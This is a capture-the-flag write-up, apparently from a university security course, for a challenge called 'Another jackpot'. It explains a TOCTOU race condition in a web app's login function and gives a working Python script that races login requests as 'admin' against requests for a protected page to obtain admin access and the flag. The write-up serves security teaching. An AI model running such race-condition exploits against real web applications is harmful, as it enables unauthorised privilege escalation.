# Challenge `Another jackpot` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to TOCTOU

- Where: Where is the vulnerability present
  - `http://mustard.stt.rnl.tecnico.ulisboa.pt:23652`

- Impact: What results of exploiting this vulnerability
  - Allows the user to gain admin permission, by exploiting a race condition in the login function, setting the username before checking for validity

## Steps to reproduce

1. Try to login on `http://mustard.stt.rnl.tecnico.ulisboa.pt:23652/login` using the `admin` username
2. Simultaneously, try to access `http://mustard.stt.rnl.tecnico.ulisboa.pt:23652/jackpot` in the same session

The code used was the following:

```py
import requests
from concurrent.futures import ThreadPoolExecutor
from threading import Event

def jackpot(stop_event):
    while not stop_event.is_set():
        jackpot_response = session.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23652/jackpot")
        if 'SSof{' in jackpot_response.text:
            print(jackpot_response.text)
            stop_event.set()

def login(stop_event):
    while not stop_event.is_set():
        login_url = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:23652/login'
        login_data = {'username': 'admin', 'password': 'admin'}
        session.post(login_url, data=login_data)

stop_event = Event()

session = requests.Session()

with ThreadPoolExecutor(max_workers=2) as executor:
    future_jackpot = executor.submit(jackpot, stop_event)
    future_login = executor.submit(login, stop_event)

future_jackpot.result()
stop_event.set()
future_login.result()
```